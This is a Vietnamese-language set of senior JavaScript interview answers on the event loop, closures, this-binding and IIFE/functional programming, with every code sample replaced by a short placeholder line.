**🎯 Ví Dụ Thực Tế:**

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Kiến Thức Senior:**
- **Hiệu năng**: Tránh chặn Call Stack với tính toán nặng → dùng Web Workers hoặc chia thành chunks với `setTimeout`.
- **Debugging**: Hiểu Event Loop → debug lỗi bất đồng bộ (race conditions, callback hell).
- **React**: `setState` batching dùng Microtask → nhiều lời gọi setState gộp thành 1 lần render lại.
- **Node.js**: `setImmediate()` vs `setTimeout(fn, 0)` → `setImmediate` chạy trong giai đoạn check, nhanh hơn trong I/O callbacks.
- **requestAnimationFrame**: Chạy TRƯỚC render (Chỉ trình duyệt) → animation mượt hơn setTimeout.

**🔧 Kỹ Thuật Tối Ưu:**
- **Chunking (Chia nhỏ)**: Chia tasks dài thành chunks nhỏ với `setTimeout` → không chặn UI.
- **queueMicrotask()**: Nhanh hơn `Promise.resolve().then()` → ít chi phí hơn.
- **Web Workers**: Offload tính toán nặng → luồng riêng (song song thật sự).

---

**❓ Câu Hỏi:**

Giải thích chi tiết cơ chế hoạt động của JavaScript Engine với Event Loop, Call Stack, Web APIs, Microtask/Macrotask Queues, và Single Thread.

**✅ Đáp Án Chi Tiết:**

**🏗️ KIẾN TRÚC TỔNG QUAN:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🧵 1. SINGLE THREAD (Đơn Luồng)**

**Khái niệm:**
- JavaScript Engine chỉ có **1 Call Stack** duy nhất
- Chỉ thực thi **1 function tại 1 thời điểm**
- Không thể chạy đồng thời nhiều tasks như multi-threaded languages (Java, C++)

**Ưu điểm:**
- ✅ Đơn giản, không có race conditions
- ✅ Không cần lock/semaphore
- ✅ Dễ debug hơn multi-threaded

**Nhược điểm:**
- ⚠️ Blocking operations (heavy computation) đóng băng toàn bộ app
- ⚠️ Không tận dụng được multi-core CPUs

---

**🔥 2. CALL STACK**

**Khái niệm:**
- LIFO stack (Last In First Out) chứa execution contexts
- Mỗi function call được push vào stack
- Khi function return, nó được pop ra khỏi stack

**Hoạt động:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Stack Overflow:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🌐 3. WEB APIs**

**Khái niệm:**
- APIs được cung cấp bởi **Browser** (hoặc Node.js runtime), KHÔNG phải JavaScript Engine
- Chạy **bên ngoài** Call Stack → không block main thread
- Khi hoàn thành, callbacks được đưa vào Queues

**Các Web APIs phổ biến:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**⚡ 4. MICROTASK QUEUE (Job Queue)**

**Khái niệm:**
- Hàng đợi chứa **microtasks** (priority cao)
- **Xử lý TẤT CẢ** microtasks trước khi chuyển sang macrotask
- Ưu tiên: **process.nextTick()** > **Promise** > **queueMicrotask**

**Các Microtasks:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🎯 5. MACROTASK QUEUE (Task Queue / Callback Queue)**

**Khái niệm:**
- Hàng đợi chứa **macrotasks** (priority thấp hơn microtask)
- Event Loop chỉ lấy **MỘT macrotask** mỗi lần
- Sau mỗi macrotask, xử lý ALL microtasks

**Các Macrotasks:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔄 6. EVENT LOOP - QUY TRÌNH HOẠT ĐỘNG**

**Thuật toán Event Loop:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔢 THỨ TỰ ƯU TIÊN:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**✅ Ưu điểm của cơ chế này:**
- Non-blocking I/O → ứng dụng responsive
- Không bị đóng băng khi chờ API/database
- Microtask giúp xử lý Promise nhanh hơn setTimeout
- UI luôn mượt mà vì rendering được ưu tiên

**⚠️ Nhược điểm:**
- **Microtask starvation**: Vô hạn microtasks → macrotask không chạy
- **Callback hell**: Lồng nhiều callbacks → khó đọc
- **Khó debug**: Thứ tự thực thi phức tạp hơn synchronous
- **Heavy computation block UI**: Vì single-threaded

**Code Example:**

**🔍 Ví dụ 1: Phân biệt Microtask vs Macrotask**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔍 Ví dụ 2: Microtask Starvation (Đói macrotask)**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔍 Ví dụ 3: Call Stack với Async/Await**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔍 Ví dụ 4: Thực Tế trong Trading App**

```js
// Ví dụ rút gọn
const example = 42;
```

**Best Practices:**

```js
// Ví dụ rút gọn
const example = 42;
```

**📋 Tóm tắt Best Practices:**

1. **Microtask (`Promise`, `queueMicrotask`)**: Dùng cho state updates, batch operations cần xử lý ngay
2. **Macrotask (`setTimeout`)**: Dùng cho defer work, animations, cho phép UI render giữa các tasks
3. **Tránh Microtask Starvation**: Không tạo vô hạn microtasks, phải có điều kiện dừng
4. **Async/await**: Hiểu rằng code sau `await` là microtask
5. **Debugging**: Luôn nhớ thứ tự: `Call Stack → All Microtasks → Render → One Macrotask`

**Common Mistakes:**

```js
// Ví dụ rút gọn
const example = 42;
```

**📋 Chú thích về các lỗi thường gặp:**

1. **setTimeout(fn, 0) ≠ chạy ngay**: Nó là macrotask, chạy sau tất cả microtasks và code đồng bộ
2. **Promise.then chạy trước setTimeout**: Microtask luôn ưu tiên cao hơn macrotask
3. **Blocking code làm đóng băng UI**: Phải break heavy work thành chunks với setTimeout
4. **Microtask starvation**: Tạo vô hạn microtasks sẽ chặn macrotasks → UI không render được

---
---

## 13. Q13: 💬 Q07: Event Loop - Giải Thích Theo Cách Nói Chuyện Đời Thường

### P1: Tên câu hỏi: 💬 Q07: Event Loop - Giải Thích Theo Cách Nói Chuyện Đời Thường

### P2: Trả lời (Senior):

## 14. Q14: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"Event Loop là cơ chế JavaScript xử lý async code trong môi trường single-threaded bằng cách liên tục kiểm tra Call Stack và Task Queues."**

**🔑 Ẩn Dụ Quán Cà Phê (dễ nhớ cho phỏng vấn):**

**"Như 1 người phục vụ (JS Engine single-thread) làm việc tại quầy (Call Stack). Khi có việc lâu (async), giao cho máy tự động (Web APIs) rồi ghi tên vào sổ chờ. Liên tục check: ① Quầy trống chưa? ② Có khách VIP chưa? (Microtasks) → Phục vụ hết VIP trước. ③ Có khách thường chưa? (Macrotasks) → Phục vụ 1 người. ④ Lặp lại."**

**🔑 3 Thành Phần Chính:**

**1. Call Stack (Quầy pha chế):**
- Xử lý **đồng bộ**, từng task một
- Empty → Event Loop mới chạy
- Stack overflow khi recursive không có base case

**2. Task Queues:**
- **Microtask Queue** (VIP): Promise `.then()`, `queueMicrotask()`, MutationObserver
- **Chạy hết tất cả** trước khi sang Macrotask
- **Macrotask Queue** (thường): `setTimeout`, `setInterval`, I/O, UI rendering
- **Chạy 1 task** rồi check Microtask lại

**3. Event Loop:**
- **Vòng lặp vô hạn** kiểm tra: Call Stack empty → Microtasks → 1 Macrotask → repeat
- Đảm bảo UI không bị block (rendering giữa các macrotasks)

**⚠️ Lỗi Thường Gặp:**
- Nghĩ `setTimeout(fn, 0)` chạy ngay → Sai! Vẫn phải chờ Call Stack empty + Microtasks xong
- Không hiểu Microtask **chạy hết tất cả** → Promise chains dài có thể block UI
- Dùng `setInterval` mà không clear → Memory leak + tasks chồng chéo

**💡 Kiến Thức Senior:**
- **Starvation**: Microtask queue dài vô hạn (recursive Promise) → Macrotasks không bao giờ chạy → UI freeze
- **Rendering timing**: Browser render giữa macrotasks (60fps = ~16ms/task), nếu task > 16ms → jank
- `requestAnimationFrame` chạy **trước render**, `setTimeout` chạy sau → dùng rAF cho animation mượt
- Node.js có **6 phases** trong Event Loop (timers, I/O, poll, check, close) khác Browser (chỉ có Micro + Macro)

**🎯 Mục Đích:**

Giải thích Event Loop theo cách dễ hiểu nhất, KHÔNG dùng thuật ngữ technical, giống như đang kể chuyện cho người không biết lập trình.

**📖 Câu Chuyện: Quán Cà Phê và Người Phục Vụ**

Tưởng tượng bạn mở một quán cà phê nhỏ:

**🏪 SETUP BAN ĐẦU:**

- **Bạn** = JavaScript Engine (chỉ có 1 người, làm single-threaded)
- **Quầy pha chế** = Call Stack (chỉ làm được 1 việc tại 1 thời điểm)
- **Danh sách chờ VIP** = Microtask Queue (ưu tiên cao - khách quen, khách VIP)
- **Danh sách chờ thường** = Macrotask Queue (ưu tiên thấp hơn - khách mới)
- **Bạn kiểm tra** = Event Loop (liên tục check xem có việc gì cần làm không)

---

**📋 QUY TRÌNH LÀM VIỆC:**

**Buổi sáng, quán mới mở cửa:**

1. **Khách A vào** → gọi "Cà phê đen nóng" (code đồng bộ)
- Bạn: "OK, pha ngay!"
- → Bạn pha xong, đưa cho khách A
- → Khách A nhận và đi

2. **Khách B vào** → gọi "Cà phê phin" (setTimeout - mất 5 phút)
- Bạn: "OK, cà phê phin phải đợi 5 phút nhé"
- → Bạn để máy pha tự động (Web API)
- → Ghi tên Khách B vào **Danh sách chờ thường**
- → **KHÔNG đứng đợi**, làm việc khác tiếp

3. **Khách C vào** → gọi "Nước cam vắt" (code đồng bộ)
- Bạn: "OK, vắt ngay!"
- → Bạn vắt xong, đưa cho khách C
- → Khách C nhận và đi

4. **Khách D vào** → gọi "Bánh mì" và hứa sẽ tip (Promise - Microtask)
- Bạn: "OK, khách tip thì ưu tiên cao!"
- → Ghi tên Khách D vào **Danh sách chờ VIP**
- → Làm việc khác tiếp

5. **Khách E vào** → gọi "Trà đá" (code đồng bộ)
- Bạn: "OK, pha ngay!"
- → Bạn pha xong, đưa cho khách E

---

**⏰ SAU ĐÓ (Event Loop bắt đầu hoạt động):**

Bạn check xem:

**① Quầy pha chế có trống không?**
- ✅ Trống rồi (Call Stack empty)

**② Có khách VIP chờ không? (Microtask Queue)**
- ✅ Có! Khách D (bánh mì - khách tip)
- → Bạn phục vụ Khách D trước (Priority cao!)
- → Khách D nhận bánh mì, đi

**③ Vẫn còn khách VIP nữa không?**
- ❌ Không (Microtask Queue empty)

**④ Có khách thường chờ không? (Macrotask Queue)**
- ✅ Có! Khách B (cà phê phin đã pha xong sau 5 phút)
- → Bạn đưa cho Khách B
- → Khách B nhận, đi

**⑤ Quay lại bước ①** (lặp lại mãi - Event Loop)

---

**🎬 VÍ DỤ CỤ THỂ VỚI CODE:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🤔 TẠI SAO LẠI NHƯ VẬY?**

**Câu hỏi 1:** Tại sao Khách B (setTimeout 0ms) không được phục vụ ngay?
- **Trả lời:** Vì Khách B vào **Danh sách chờ thường** (Macrotask). Dù chờ 0ms, nhưng phải đợi hết việc đang làm + khách VIP mới đến lượt.

**Câu hỏi 2:** Tại sao Khách D (Promise) được phục vụ trước Khách B?
- **Trả lời:** Vì Khách D là **Khách VIP** (Microtask), có ưu tiên cao hơn Khách thường (Macrotask).

**Câu hỏi 3:** Nếu có 100 khách VIP liên tục, khách thường có được phục vụ không?
- **Trả lời:** KHÔNG! Đây gọi là **"Microtask Starvation"** (Đói khách thường). Bạn cứ phục vụ khách VIP mãi, khách thường chờ mãi không tới lượt.

---

**🍕 VÍ DỤ THỰC TẾ: ĐẶT PIZZA**

```js
// Ví dụ rút gọn
const example = 42;
```

**Giải thích:**
1. Bạn làm hết việc đang làm (xem TV, ăn bỏng ngô)
2. Nhớ lấy tiền tip (Microtask - việc quan trọng)
3. Cuối cùng mới nhận pizza (Macrotask - đã hẹn trước 3 giây)

---

**🚗 VÍ DỤ: ĐI SIÊU THỊ**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**⚠️ TÌNH HUỐNG XẤU: KHÁCH VIP VÔ HẠN (Microtask Starvation)**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**✅ NGUYÊN TẮC VÀNG (Không Technical):**

1. **Làm việc đang làm trước** (Code đồng bộ)
2. **Ưu tiên khách VIP** (Promise, Microtask)
3. **Sau đó mới đến khách thường** (setTimeout, Macrotask)
4. **Không tạo khách VIP vô hạn** (tránh Microtask Starvation)
5. **Luôn check lại** (Event Loop lặp mãi)

---

**🎯 TÓM TẮT BẰNG 1 CÂU:**

> **"Làm hết việc đang làm, ưu tiên khách VIP, rồi mới phục vụ khách thường, và cứ thế lặp lại mãi."**

---

**📝 SO SÁNH VỚI ĐỜI SỐNG THỰC:**

| Thuật Ngữ Technical | Ví Dụ Đời Thường |
|---------------------|------------------|
| Call Stack | Việc đang làm (pha cà phê, vắt cam) |
| Microtask Queue | Danh sách khách VIP (ưu tiên cao) |
| Macrotask Queue | Danh sách khách thường (chờ lâu hơn) |
| Event Loop | Bạn liên tục check xem còn việc gì chưa |
| Web APIs | Máy pha tự động, đồng hồ hẹn giờ |
| Single Thread | Chỉ có 1 bạn làm việc, không có nhân viên phụ |
| Non-blocking | Không đứng đợi, làm việc khác trong lúc chờ |
| Async | Đặt hẹn giờ, chờ giao hàng |

---

**🎓 BÀI HỌC:**

- JavaScript chỉ có **1 người làm việc** (single-threaded)
- Nhưng **rất thông minh**: không đợi, làm nhiều việc cùng lúc nhờ **ưu tiên** và **hẹn giờ**
- **Khách VIP** (Microtask) luôn được ưu tiên hơn **khách thường** (Macrotask)
- Phải **cẩn thận** không tạo khách VIP vô hạn, nếu không khách thường đói chết!

**💡 Nhớ công thức:**

```js
// Ví dụ rút gọn
const example = 42;
```

---
---

## 15. Q15: 🔐 Q08: Closure & Data Privacy

### P1: Tên câu hỏi: 🔐 Q08: Closure & Data Privacy

### P2: Trả lời (Senior):

## 16. Q16: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (1-2 phút):**

**"Closure = hàm + môi trường từ vựng (các biến xung quanh nó). Hàm bên trong giữ tham chiếu đến biến scope bên ngoài.**

**📦 Core Concepts:**
- **Definition**: Function nhớ được và access được biến từ outer scope, ngay cả khi outer function đã return.
- **Mechanism**: Inner function giữ reference đến [[Scope]] (lexical environment) của outer function.
- **Data Privacy**: Dùng closure để tạo private variables/methods (encapsulation).

**🎯 Use Cases:**
1. **Private Variables**: Factory functions trả về object với methods access private state.
2. **Module Pattern**: IIFE + closure → private state + public API.
3. **Event Handlers**: Callback giữ reference đến outer variables.
4. **Partial Application**: Currying, function factories (e.g., `makeAdder(5)`).
5. **Memoization**: Cache results của expensive functions.

**⚠️ Common Pitfalls:**
- **Memory Leaks**: Closure giữ reference → biến không bị GC → memory leak nếu không cleanup.

```js
// Ví dụ rút gọn
const example = 42;
```

- **Loop + Closures**: `var` trong loop → mọi closure chia sẻ cùng biến.

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Senior Insights:**
- **Performance**: Closures có overhead nhỏ (memory + lookup time), nhưng negligible trong hầu hết cases.
- **DevTools**: Chrome DevTools → Memory Profiler → check closure retaining objects.
- **ES6 Modules**: Replace IIFE module pattern → native private scope.
- **WeakMap**: Alternative cho private data không dùng closure → auto GC khi object không còn reference.

---

**⚡ Quick Summary:**
> Closure = function nhớ được biến từ outer scope ngay cả khi outer function đã return. Dùng để private data

**💡 Ghi Nhớ:**
- 🔥 **Definition**: Function + Lexical Environment (biến xung quanh nó)
- 🎯 **Use Cases**: Private variables, Factory functions, Callbacks, Event handlers
- ⚡ **Memory**: Closure giữ reference → biến không bị GC → cẩn thận memory leak
- 📦 **Module Pattern**: IIFE + Closure = private state

**Trả lời:**

- **Closure**: Function có thể access variables từ outer scope ngay cả khi outer function đã return
- **Data Privacy**: Sử dụng closure để tạo private variables
- **Hoạt động**: Inner function giữ reference đến outer scope
- **Ưu điểm**: Encapsulation, data privacy, module pattern
- **Nhược điểm**: Có thể gây memory leaks nếu không quản lý tốt

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Best Practices:**

- Sử dụng closure cho data privacy
- Sử dụng module pattern
- Tránh memory leaks
- Sử dụng TypeScript cho type safety

**Mistakes:**

```js
// Ví dụ rút gọn
const example = 42;
```

#### Vì sao Redux/Zustand dùng closure để lưu trạng thái?

- **Encapsulation (đóng gói state an toàn)**: State sống trong phạm vi từ vựng (lexical scope) của store, không thể bị thay đổi trực tiếp từ bên ngoài nếu không đi qua API công khai (getState, setState, subscribe). Tránh lộ biến toàn cục và hạn chế đột biến ngoài ý muốn.
- **API nhỏ gọn, không cần lớp/phụ trợ**: Một factory function tạo store trả về các hàm thao tác; closure giữ state và danh sách listeners. Không bắt buộc dùng class/this, giảm rủi ro context.
- **Hiệu năng dự đoán được**: Không cần Proxy hay getter/setter; cập nhật state là thao tác thuần (immutable/mutable tùy chiến lược), thông báo qua danh sách subscribers trong cùng closure → chi phí thấp, dễ tối ưu.
- **Khả năng multiple store độc lập**: Mỗi lần gọi factory tạo một scope mới với state riêng, không rò rỉ chéo. Dễ tạo nhiều store, test theo từng instance.

Ví dụ mô phỏng (đơn giản hóa theo phong cách Zustand):

```js
// Ví dụ rút gọn
const example = 42;
```

So với lựa chọn khác:

- **Class + this**: Cần ràng buộc ngữ cảnh, dễ lỗi khi truyền phương thức; khó tree-shake hơn nếu không cẩn thận.
- **Proxy**: Tiện reactive nhưng tốn chi phí bẫy (traps), phức tạp debug, không cần thiết khi chỉ cần pub/sub đơn giản.
- **Global singleton**: Dễ rò rỉ state giữa tests/SSR, khó tạo nhiều instance độc lập.
---

## 17. Q17: ➡️ Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)

### P1: Tên câu hỏi: ➡️ Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)

### P2: Trả lời (Senior):

## 18. Q18: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"Arrow function khác regular function ở cách gắn `this`: từ vựng (scope bên ngoài) vs động (ngữ cảnh runtime).**

**📊 Arrow vs Regular Functions (Key Differences):**
1. **`this` Binding**:
- **Arrow**: Lexical `this` → inherit từ outer scope (không có `this` riêng).
- **Regular**: Dynamic `this` → phụ thuộc cái gì gọi function (runtime).

2. **`arguments` Object**:
- **Arrow**: Không có `arguments` → dùng rest params `(...args)`.
- **Regular**: Có `arguments` (array-like object).

3. **Constructor**:
- **Arrow**: Không dùng được `new` → throw error.
- **Regular**: Có thể dùng `new` → tạo instance.

4. **Hoisting**:
- **Arrow**: Không hoisted (nếu dùng `const/let`).
- **Regular**: Hoisted (function declaration).

**🔧 `this` Binding Methods (call, apply, bind):**
- **`call(thisArg, arg1, arg2)`**: Invoke ngay với arguments riêng lẻ.

```js
// Ví dụ rút gọn
const example = 42;
```

- **`apply(thisArg, [args])`**: Invoke ngay với arguments array.

```js
// Ví dụ rút gọn
const example = 42;
```

- **`bind(thisArg)`**: Return function mới với `this` cố định (không invoke).

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 `this` Binding Rules (4 Rules - Priority Order):**
1. **`new` Binding**: `new Fn()` → `this` = new object.
2. **Explicit Binding**: `call/apply/bind` → `this` = thisArg.
3. **Implicit Binding**: `obj.method()` → `this` = obj.
4. **Default Binding**: Standalone function → `this` = global object (window/global) hoặc undefined (strict mode).

**⚠️ Common Mistakes:**
- **Arrow trong object methods**: `this` không point to object!

```js
// Ví dụ rút gọn
const example = 42;
```

- **Event handlers**: Regular function → `this` = event target. Arrow → `this` = outer scope.
- **Class methods as callbacks**: Mất context → dùng arrow hoặc bind.

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Senior Insights:**
- **React Class Components**: Arrow class fields = auto-bind `this` (babel transform).
- **Performance**: Arrow functions trong render → tạo new reference mỗi lần → child re-render. Dùng `useCallback`.
- **call vs apply**: `apply` hữu ích khi arguments đã là array (e.g., `Math.max.apply(null, [1,2,3])`).
- **Polyfill bind**: Implement bind manually để hiểu cơ chế:

```js
// Ví dụ rút gọn
const example = 42;
```

---

**⚡ Quick Summary:**
> Arrow function = lexical `this` (từ outer scope), không có arguments, không dùng new. `this` trong JS = context object, dùng call/apply/bind để set `this` manually.

**💡 Ghi Nhớ:**
- 🎯 **Arrow**: `() => {}` - this từ outer scope, không có arguments/constructor
- 📌 **Regular**: `function(){}` - this runtime, có arguments, hoisted
- 📞 **call**: `fn.call(thisArg, arg1, arg2)` - invoke ngay với args riêng lẻ
- 📋 **apply**: `fn.apply(thisArg, [args])` - invoke ngay với array
- 🔗 **bind**: `fn.bind(thisArg)` - return function mới với this cố định

### **1. Arrow vs Regular Functions - Sự Khác Biệt Quan Trọng**

#### **1.1. Syntax & Declaration**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **1.2. this Binding - Khác Biệt QUAN TRỌNG Nhất**

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Quy tắc this:**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **1.3. arguments Object**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **1.4. Constructor & new**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **1.5. Hoisting**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **1.6. Methods & Prototype**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **2. this Binding - call, apply, bind**

#### **2.1. Understanding `this` Context**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **2.2. call() - Gọi ngay với arguments riêng lẻ**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **2.3. apply() - Gọi ngay với array of arguments**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **2.4. bind() - Tạo function mới với this cố định**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **3. So Sánh Tổng Quan**

#### **3.1. Arrow vs Regular Functions**

| Feature | Arrow Function | Regular Function |
|---------|---------------|------------------|
| **Syntax** | `() => {}` | `function() {}` |
| **this binding** | Lexical (từ outer scope) | Dynamic (runtime) |
| **arguments** | ❌ Không có | ✅ Có |
| **Constructor** | ❌ Không dùng `new` | ✅ Dùng được `new` |
| **Hoisting** | ❌ Không hoisted | ✅ Hoisted |
| **prototype** | ❌ undefined | ✅ Có prototype |
| **Method** | ❌ Không nên dùng | ✅ Nên dùng |
| **Callback** | ✅ Nên dùng | ❌ Mất this |

#### **3.2. call vs apply vs bind**

| Method | Syntax | Invoke ngay? | Use case |
|--------|--------|--------------|----------|
| **call** | `fn.call(thisArg, arg1, arg2)` | ✅ Có | Biết chính xác số arguments |
| **apply** | `fn.apply(thisArg, [args])` | ✅ Có | Arguments là array |
| **bind** | `fn.bind(thisArg, arg1)` | ❌ Không | Event handlers, partial application |

---

### **4. Best Practices & Common Mistakes**

#### **4.1. Best Practices**

```js
// Ví dụ rút gọn
const example = 42;
```

#### **4.2. Common Mistakes**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **5. Real-World Examples**

```js
// Ví dụ rút gọn
const example = 42;
```

---

### **💡 Key Takeaways**

**Arrow Functions:**
- ✅ Dùng cho callbacks, array methods (map, filter, forEach...)
- ✅ Dùng khi muốn giữ this từ outer scope
- ❌ Không dùng cho object methods
- ❌ Không dùng làm constructors

**Regular Functions:**
- ✅ Dùng cho object methods
- ✅ Dùng khi cần arguments object
- ✅ Dùng làm constructors
- ❌ Dễ mất this trong callbacks (phải bind)

**call/apply/bind:**
- 📞 **call**: Gọi ngay với args riêng lẻ → function borrowing
- 📋 **apply**: Gọi ngay với array args → Math.max(array)
- 🔗 **bind**: Tạo function mới → event handlers, partial application

**Remember:**
> "Arrow function = lexical this (từ outer scope). Regular function = dynamic this (runtime). Dùng call/apply khi cần gọi ngay, bind khi cần function mới với this cố định!" 🎯
---

## 19. Q19: 🎯 Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming

### P1: Tên câu hỏi: 🎯 Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming

### P2: Trả lời (Senior):

## 20. Q20: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"IIFE là function execute ngay sau khi define để tạo private scope, còn Functional Programming bao gồm pure functions, immutability, currying và higher-order functions."**

**🔑 4 Khái Niệm Chính:**

**1. IIFE (Immediately Invoked Function Expression):**
- Syntax: `(function(){ ... })()` hoặc `(() => { ... })()`
- **Tạo scope riêng** → tránh pollute global namespace
- Use case: Module pattern (trước ES6 modules), private variables, avoid variable hoisting conflicts
- **Ví dụ**: `const counter = (function(){ let count=0; return {inc: ()=>++count} })()`

**2. Pure Functions:**
- **Same input → same output**, không có side effects (không modify external state)
- **Predictable**, dễ test, dễ debug
- Ví dụ: `add(a,b) => a+b` (pure) vs `arr.push(x)` (impure - mutate arr)

**3. Currying:**
- Transform `f(a,b,c)` thành `f(a)(b)(c)` - **partial application**
- **Reusable functions** với preset arguments: `const add5 = add(5); add5(10) // Chú giải: 15`
- Use case: event handlers, middleware, configuration functions

**4. Higher-Order Functions:**
- Functions nhận/return functions: `.map()`, `.filter()`, `.reduce()`
- **Composition**: kết hợp nhiều functions `compose(f, g, h)(x) = f(g(h(x)))`
- Use case: middleware stack, decorators, memoization

**⚠️ Lỗi Thường Gặp:**
- Quên `()` trong IIFE → `(function(){})` không execute
- Mutate data trong pure function → side effects, khó debug
- Over-curry functions → code khó đọc `f(a)(b)(c)(d)(e)`

**💡 Kiến Thức Senior:**
- IIFE giờ **ít dùng** vì ES6 modules (`import/export`) và block scope (`let/const`)
- Pure functions quan trọng cho **memoization** (cache kết quả) và **parallelization**
- Currying vs Partial Application: Curry **luôn return unary** (1 param), Partial có thể nhiều params
- Functional Programming giúp **avoid shared mutable state** → tránh race conditions trong async code

**⚡ Quick Summary:**
> IIFE = `(function(){})()` - chạy ngay, tạo scope riêng. FP = pure functions, immutability

**💡 Ghi Nhớ:**
- 🎯 **IIFE**: Execute ngay, tránh pollute global scope
- 🔥 **Pure Function**: Same input → same output, no side effects
- 📦 **Currying**: `f(a,b)` → `f(a)(b)` - partial application

**❓ Câu Hỏi:**

Giải thích IIFE, Pure Functions, Currying và Higher-Order Functions trong JavaScript. Bao gồm cách hoạt động, ưu nhược điểm và ứng dụng thực tế.

---

**📚 Phần 1: IIFE (Immediately Invoked Function Expression)**

**💡 IIFE Là Gì?**

IIFE (đọc là "iffy") là một function được **gọi ngay lập tức** sau khi được định nghĩa. Nó tạo ra một **scope riêng biệt**, giúp tránh ô nhiễm global namespace.

**🔥 Cú Pháp:**

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Tại Sao Cần IIFE?**

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Use Cases của IIFE:**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Ưu Điểm của IIFE:**

- ✅ **Data Privacy**: Tạo private variables/functions
- ✅ **Tránh Global Pollution**: Variables không rò rỉ ra global scope
- ✅ **Module Pattern**: Tạo modules với public/private members
- ✅ **One-time Execution**: Code chạy 1 lần duy nhất

**❌ Nhược Điểm của IIFE:**

- ❌ **Khó đọc**: Syntax phức tạp cho beginners
- ❌ **Khó debug**: Stack trace phức tạp hơn
- ❌ **ES6 Modules tốt hơn**: Hiện nay dùng `import/export` thay thế

---

**📚 Phần 2: Functional Programming - Pure Functions, Currying & HOF**

**💡 Functional Programming Là Gì?**

Functional Programming (FP) là paradigm lập trình tập trung vào:

- **Pure Functions**: Hàm không có side effects
- **Immutability**: Không thay đổi dữ liệu gốc
- **Function Composition**: Kết hợp các hàm nhỏ thành hàm lớn

---

**🔥 1. Pure Functions (Hàm Thuần Túy)**

**💡 Pure Function Là Gì?**

Pure function là hàm thỏa mãn 2 điều kiện:

1. **Same Input → Same Output**: Cùng input luôn cho cùng output
2. **No Side Effects**: Không thay đổi state bên ngoài (global variables, database, file, etc.)

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Ưu Điểm của Pure Functions:**

- ✅ **Testable**: Dễ test (chỉ cần check input/output)
- ✅ **Predictable**: Dự đoán được kết quả
- ✅ **Cacheable**: Có thể cache kết quả (memoization)
- ✅ **Parallel Safe**: An toàn khi chạy song song

---

**🔥 2. Currying (Chuyển Đổi Hàm)**

**💡 Currying Là Gì?**

Currying là kỹ thuật **chuyển đổi** một function nhận **nhiều tham số** thành **chuỗi các functions**, mỗi function nhận **1 tham số**.

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Use Cases của Currying:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔥 3. Higher-Order Functions (HOF - Hàm Bậc Cao)**

**💡 HOF Là Gì?**

HOF là function thỏa mãn 1 trong 2 điều kiện:

1. **Nhận function làm argument** (tham số)
2. **Trả về function** (return function)

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Practical Example - Data Processing:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**✅ Best Practices:**

- ✅ **Ưu tiên Pure Functions**: Code predictable, dễ test
- ✅ **Dùng Currying cho reusable functions**: Tạo specialized functions
- ✅ **Dùng HOF thay vì loops**: `map`, `filter`, `reduce` ngắn gọn hơn
- ✅ **Function Composition**: Kết hợp functions nhỏ thành function lớn
- ✅ **IIFE cho module pattern**: Tạo private scope khi cần

**❌ Common Mistakes:**

```js
// Ví dụ rút gọn
const example = 42;
```

**📝 Tóm Tắt:**

| Concept        | Mô Tả                                          | Use Case                      |
| -------------- | ---------------------------------------------- | ----------------------------- |
| **IIFE**       | Function tự gọi, tạo scope riêng               | Module pattern, private state |
| **Pure**       | Hàm không side effects, predictable            | Business logic, calculations  |
| **Currying**   | Function nhiều tham số → chuỗi functions       | Reusable functions, config    |
| **HOF**        | Function nhận/trả về function                  | map, filter, reduce, compose  |
| **Functional** | Paradigm tập trung vào pure functions, compose | Clean code, maintainable      |
---

## 21. Q21: 🎪 Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)

### P1: Tên câu hỏi: 🎪 Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)

### P2: Trả lời (Senior):

